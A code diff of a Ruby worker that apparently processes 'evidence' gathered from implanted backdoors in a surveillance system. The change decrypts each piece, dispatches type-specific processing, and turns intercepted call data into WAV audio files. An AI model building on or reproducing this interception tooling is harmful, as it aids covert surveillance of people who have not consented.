@@ -21,7 +21,7 @@ module Worker
 class Worker
   include Tracer
   
-  attr_reader :type
+  attr_reader :type, :audio_processor
   
   def initialize(db_file, type)
     
@@ -30,9 +30,9 @@ class Worker
     
     # type of evidences to be processed
     @type = type
-
+    
     @audio_processor = AudioProcessor.new
-
+    
     trace :info, "Working on evidence stored in #{@instance}, type #{@type.to_s}."
     
   end
@@ -43,7 +43,7 @@ class Worker
   
   def process
     require 'pp'
-
+    
     info = RCS::EvidenceManager.instance_info(@instance)
     trace :info, "Processing backdoor #{info['build']}:#{info['instance']}"
     
@@ -51,7 +51,7 @@ class Worker
     # we need to calculate the MD5 and use it in binary form
     trace :debug, "Evidence key #{info['key']}"
     evidence_key = Digest::MD5.digest info['key']
-
+    
     evidence_sizes = RCS::EvidenceManager.evidence_info(@instance)
     evidence_ids = RCS::EvidenceManager.evidence_ids(@instance)
     trace :info, "Pieces of evidence to be processed: #{evidence_ids.join(', ')}."
@@ -63,6 +63,16 @@ class Worker
       # deserialize evidence
       begin
         evidence = RCS::Evidence.new(evidence_key).deserialize(binary)
+        mod = "#{evidence.type.to_s.capitalize}Processing"
+        evidence.extend eval mod if RCS.const_defined? mod.to_sym
+        evidence.process if evidence.respond_to? :process
+        
+        case evidence.type
+          when :CALL
+            @audio_processor.feed(evidence)
+            @audio_processor.to_wavfile
+        end
+      
       rescue EvidenceDeserializeError
         trace :fatal, "FAILURE: " << e.to_s
         trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
@@ -70,18 +80,7 @@ class Worker
         trace :fatal, "FAILURE: " << e.to_s
         trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
       end
-
-      puts evidence.type
       
-      # postprocess evidence
-      begin
-        mod = "#{evidence.type.to_s.capitalize}PostProcessing"
-        evidence.extend eval mod if RCS.const_defined? mod.to_sym
-        evidence.postprocess if evidence.respond_to? :postprocess
-      rescue Exception => e
-        trace :fatal, "FAILURE: " << e.to_s
-        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-      end
     end
     
     trace :info, "All evidence has been processed."
@@ -125,6 +124,8 @@ class Application
       trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
       return 1
     end
+    
+    puts w.audio_processor
     
     return 0
   end
